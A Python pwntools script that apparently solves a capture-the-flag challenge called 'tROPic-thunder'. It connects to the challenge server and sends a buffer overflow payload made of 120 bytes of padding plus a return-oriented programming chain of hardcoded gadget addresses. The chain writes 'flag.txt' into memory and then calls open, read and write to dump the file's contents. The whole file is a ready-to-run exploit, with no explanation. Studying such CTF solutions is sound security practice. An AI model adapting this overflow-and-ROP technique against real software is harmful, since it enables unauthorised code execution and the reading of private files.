#!/usr/bin/python3
from pwn import *

BINARY = './tROPic-thunder'

elf = context.binary = ELF(BINARY, checksec=False)

def start():
    if args.GDB:
        return gdb.debug(elf.path)
    if args.REMOTE:
        return remote("thunder.sdc.tf", 1337)
    else:
        return process(elf.path)

io = start()

# gadgets
pop_rax = p64(0x00000000004005af)
pop_rdi = p64(0x00000000004006a6)
pop_rsi = p64(0x000000000040165c)
pop_rdx = p64(0x00000000004589f5)
syscall = p64(0x000000000041003c)
mov_qword_rax_rdx = p64(0x000000000049c571)
syscall_ret = p64(0x484105)

flag = b"flag.txt"
padding = 120*b"A"

# area to write the "flag.txt"
d = p64(0x6d60f0)


payload = padding + pop_rax + d + pop_rdx + flag + mov_qword_rax_rdx # pointer to flag.txt
payload += pop_rax + p64(2) + pop_rdi + d + pop_rsi + p64(0) + pop_rdx + p64(0) + syscall_ret # open
payload += pop_rdi + p64(3) + pop_rsi + d + pop_rdx + p64(0x64) + pop_rax + p64(0) + syscall_ret # read
payload += pop_rdi + p64(1) + pop_rsi + d + pop_rdx + p64(0x64) + pop_rax + p64(1) + syscall # write

io.sendline(payload)


io.interactive()
